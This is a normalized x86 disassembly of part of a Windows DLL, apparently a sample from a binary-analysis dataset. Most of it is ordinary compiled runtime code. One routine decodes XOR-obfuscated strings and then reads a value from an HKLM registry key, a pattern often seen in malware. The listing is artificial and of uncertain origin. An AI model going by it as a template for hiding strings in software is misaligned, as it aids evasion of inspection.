cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x58 ]
push ecx
push eax
call sub_1007c060
pop ecx
pop ecx
mov [ ebp - 0x4c ] eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov esi [ ebp - 0x2c ]
jae r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx [ ebp - 0x84 ]
movsx eax al
cmp eax ecx
jae r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
lea esi [ ebp - 0x2c ]
sub [ ebp - 0x4c ] eax
push 0x0
push 0x1
push [ ebp - 0x4c ]
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_1004a7e0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp + 0x8 ]
add esp 0xc
fld [ ebp + 0x8 ]
pop ebp
retn
sub_1004a800
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
lea edi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005e3c0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1004a850
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ rw-data ]
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
sar eax 0x2
cmp eax 0x1
ja r-xdata
push esi
mov esi [ edi + 0x4 ]
cmp esi [ edi + 0x8 ]
je r-xdata
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop esi
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
nop
push ebx
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov ecx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push esi
call sub_10077d10
add [ edi + 0x8 ] 0xfffffffc
add esp 0xc
xor eax eax
add esi 0x4
cmp esi [ edi + 0x8 ]
jne r-xdata
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
sub_1004a8fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_1001742d
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_10014f9e
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_1001742d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
push esi
call sub_1001742d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001742d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001742d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1001742d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_1001742d
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_1001742d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001742d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_1001742d
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1006a35a
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_1001742d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_1001742d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_100036b3
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_1004aa85
push 0x198
mov eax sub_1007f0e7
call sub_10007703
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x184 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10008fcf
pop ecx
lea ecx [ ebp - 0x198 ]
lea eax [ ebp - 0x19c ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10007739
pop ecx
lea ecx [ ebp - 0x19c ]
jmp r-xdata
mov ecx [ ebp - 0x17c ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002a730
and [ ebp - 0x38 ] 0x0
push 0xf
pop edi
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] 0x0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x18c ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x17c ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x18c ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_100208e0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x1a0 ]
mov [ esi + 0x14 ] edi
lea eax [ ebp - 0x64 ]
xor edi edi
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
push edi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1001c5c0
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax esi
call sub_10019c00
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x17c ]
cmp [ ebp - 0x161 ] 0x0
push 0xf
pop edi
je r-xdata
mov ecx [ ebp - 0x184 ]
lea eax [ ebp - 0x190 ]
push eax
call sub_10009450
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1004c670
pop ecx
lea ecx [ ebp - 0x190 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002a730
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10020962
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
push 0x2d
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10051fc9
mov ebx eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x184 ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x17c ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
inc ebx
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_10039e87
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
and [ ebp - 0x178 ] 0x0
mov ecx ebx
call [ eax + 0x1c ]
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1002a674
cmp [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0xb
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
movzx eax [ esi + 0x5 ]
mov ecx [ edi + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
mov ecx esi
call sub_1004cd62
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1004cd62
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x144 ]
push eax
call sub_10039e87
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov bl al
test bl bl
je r-xdata
mov ecx [ ebp - 0x38 ]
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_10017b01
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_100208e0
cmp [ esi + 0x4 ] al
jne r-xdata
cmp al [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1001c5c0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
mov bl al
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov al [ esi + 0x5 ]
cmp al [ ebx ]
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1001c5c0
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_10017b01
jmp r-xdata
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_100171f8
or [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x10 ] ebx
jbe r-xdata
mov ecx esi
call sub_10017b01
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10039e87
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_100172f0
push ebx
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
xor ebx ebx
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] 0x0
call sub_1004b830
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
xor edi edi
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xf0 ]
push eax
call sub_100171f8
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1001c5c0
jmp r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
lea ecx [ ebp - 0x80 ]
jmp r-xdata
mov edi eax
sub edi [ ebp - 0x178 ]
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
cmp al [ edi ]
jne r-xdata
mov ecx esi
call sub_1004cd62
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1001c5c0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x30
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10050f80
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
inc edi
call sub_10017b01
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1001c5c0
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ ebp - 0x188 ] al
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10050f80
mov ecx esi
call sub_10017b01
mov ecx esi
call sub_1004cd62
mov ecx esi
call sub_10017b01
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_10039e87
mov edi [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1001c5c0
cmp edi ebx
je r-xdata
mov ecx esi
call sub_10017b01
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x160 ]
push eax
call sub_100171f8
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_100172f0
push ebx
push 0x1
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x3
call sub_1001c5c0
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
mov eax [ ebp - 0x178 ]
cmp eax [ ebp - 0x180 ]
jge r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1001c5c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_100171f8
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1001c5c0
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_1004cd62
mov al [ esi + 0x5 ]
mov [ ebp - 0x194 ] al
push [ ebp - 0x194 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10050f80
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10050f80
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_10017b01
push [ ebp - 0x16c ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi + 0x5 ]
mov [ ebp - 0x1a4 ] al
push [ ebp - 0x1a4 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10050f80
inc [ ebp - 0x178 ]
mov ecx esi
call sub_1004cd62
sub_1004b3c0
push ebp
mov ebp esp
sub esp 0x2bc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x64
and edx 0xff
mov [ ebp + eax * 2 - 0xac ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x54 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x51
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x2b8 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0xac ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0x2bc ]
push eax
mov eax [ ebp - 0x2b8 ]
lea ecx [ ebp - 0x2b4 ]
push ecx
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ ebp - 0x2bc ] 0x208
call [ RegQueryValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x2b8 ]
push ecx
call [ RegCloseKey@IAT ]
test esi esi
pop esi
je r-xdata
mov esi 0x2
lea edx [ ebp - 0x50 ]
mov eax 0xd
call sub_10036cd0
mov edx [ edi + 0xd54 ]
movzx eax [ edi + 0x11a ]
movzx ecx [ edi + 0x118 ]
neg edx
sbb edx edx
and edx 0x20
add edx 0x20
push edx
mov edx [ edi + 0x10 ]
push eax
mov eax [ edi + 0xc ]
push ecx
mov ecx [ edi + 0x8 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x2b4 ]
push edx
lea eax [ ebp - 0x50 ]
push eax
mov ecx 0x104
call sub_100254a0
xor ecx ecx
add esp 0x20
test eax eax
setns cl
pop ebx
lea eax [ ecx - 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
and eax 0x2
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1004b520
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10038ea0
fstp [ ebp - 0x4 ]
fld [ ebp - 0x4 ]
add esp 0x10
leave
retn
sub_1004b542
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jae r-xdata
sub edi eax
cmp [ ebp + 0x10 ] edi
jae r-xdata
push r--data
call sub_1003b4a6
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push 0x0
push edi
call sub_10064dae
test al al
je r-xdata
push 0xffffffff
add edi eax
push edi
call sub_1001a5e2
push [ ebp + 0xc ]
mov ecx esi
push 0x0
call sub_1001a5e2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea eax [ eax + edx * 2 ]
push eax
push ecx
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
sub_1004b5df
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_10017366
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1002868d
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1004a342
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1004b789
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
